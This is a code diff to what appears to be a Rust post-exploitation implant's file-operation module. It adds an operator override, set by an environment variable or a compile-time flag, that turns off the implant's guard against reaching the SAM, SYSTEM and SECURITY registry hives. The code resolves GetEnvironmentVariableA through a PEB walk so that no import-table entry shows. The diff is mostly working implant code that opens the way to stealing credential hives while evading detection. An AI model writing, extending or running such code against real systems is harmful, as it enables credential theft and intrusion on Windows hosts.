@@ -148,11 +148,41 @@ struct FileDirectoryInformation {
 
 // ---- path helpers ---------------------------------------------------------
 
+/// Returns `true` if the operator has opted out of the protected-path guard.
+/// Compile-time cfg (`--cfg nyx_fs_allow_protected`) for SYSTEM-context
+/// deployments where the env can't be passed, or run-time env var
+/// `NYX_FS_ALLOW_PROTECTED=1` for engagements that need hive access.
+fn protected_override() -> bool {
+    if cfg!(nyx_fs_allow_protected) {
+        return true;
+    }
+    // Resolve GetEnvironmentVariableA once (PEB-walk, no IAT entry).
+    unsafe {
+        if let Some(p) = crate::resolve::export_addr(b"kernel32.dll", b"GetEnvironmentVariableA") {
+            let func: unsafe extern "system" fn(*const u8, *mut u8, u32) -> u32 =
+                core::mem::transmute(p);
+            let name = b"NYX_FS_ALLOW_PROTECTED\0";
+            let mut buf = [0u8; 2];
+            let n = func(name.as_ptr(), buf.as_mut_ptr(), buf.len() as u32);
+            // "1" (or "1\0") → override active.
+            n >= 1 && buf[0] == b'1'
+        } else {
+            false
+        }
+    }
+}
+
 /// Refuse writes/deletes into the SAM/SYSTEM/SECURITY registry hives (which
 /// back `\Windows\System32\config\SAM`, `SYSTEM`, `SECURITY`, `SOFTWARE`,
 /// `DEFAULT`). Reading those offline is the classic LSASS-adjacent op; the
 /// implant deliberately refuses them so the config can't be exfiltrated via a
 /// plain Download. Returns `true` if the path is allowed.
+///
+/// **Operator override:** the guard is bypassed if either:
+/// - compiled with `--cfg nyx_fs_allow_protected` (for engagements where the
+///   operator needs hive access and accepts the oplock-brick risk), or
+/// - the env var `NYX_FS_ALLOW_PROTECTED=1` is set in the implant's process
+///   environment (for run-time override without a rebuild).
 ///
 /// The check is path-component-aware: it splits on `/` or `\`, and refuses any
 /// path whose components contain `config` immediately followed by a hive name.
@@ -160,6 +190,10 @@ struct FileDirectoryInformation {
 /// `config\SAM` (no leading separator) AND forward-slash variants — without
 /// false-matching on filenames like `config\default.dat` (`.dat` != `default`).
 fn allowed(path: &str) -> bool {
+    // Operator override: env var or compile-time cfg disables the hive guard.
+    if protected_override() {
+        return true;
+    }
     // Normalize: collapse runs of `/` and `\` into a single `\`, lowercase
     // everything. This defeats double-slash tricks (`\\`, `//`) before the
     // substring check.
@@ -576,6 +610,9 @@ pub fn do_fileop(rt: &Runtime, op: FileOp, path: &str, dest: Option<&str>) -> Re
 
 /// Cd: verify `path` exists and is a directory (NtQueryAttributesFile).
 fn fileop_cd(rt: &Runtime, path: &str) -> Response {
+    if !allowed(path) {
+        return Response::Err(String::from("cd: refusing protected target"));
+    }
     let pathbuf = match to_nt_path(path) {
         Some(p) => p,
         None => return Response::Err(String::from("cd: invalid path")),
@@ -620,6 +657,9 @@ fn fileop_cd(rt: &Runtime, path: &str) -> Response {
 
 /// Mkdir: NtCreateFile with FILE_DIRECTORY_FILE + FILE_CREATE.
 fn fileop_mkdir(rt: &Runtime, path: &str) -> Response {
+    if !allowed(path) {
+        return Response::Err(String::from("mkdir: refusing protected target"));
+    }
     unsafe {
         match open_file(
             rt,
